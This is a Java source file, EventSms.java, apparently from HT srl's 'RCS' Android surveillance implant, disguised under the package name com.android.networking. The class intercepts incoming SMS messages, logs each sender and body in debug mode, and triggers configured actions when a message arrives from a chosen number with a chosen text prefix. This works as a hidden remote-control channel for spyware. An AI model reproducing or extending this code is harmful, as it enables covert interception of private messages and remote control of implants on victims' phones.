/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
 * *******************************************/

package com.android.networking.event;

import java.io.IOException;

import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfEvent;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerSms;
import com.android.networking.module.message.Sms;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.WChar;

public class EventSms extends BaseEvent implements Observer<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "EventSms"; //$NON-NLS-1$

	private int actionOnEnter;
	private String number, msg;

	@Override
	public void actualStart() {
		ListenerSms.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerSms.self().detach(this);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			number = conf.getString("number");
			msg = conf.getString("text");

		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sms s) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
		}

		if (s.getAddress().toLowerCase().endsWith(this.number) == false) {
			return 0;
		}

		// Case insensitive
		if (s.getBody().toLowerCase().startsWith(this.msg) == false) {
			return 0;
		}

		onEnter();
		onExit();

		return 1;
	}
}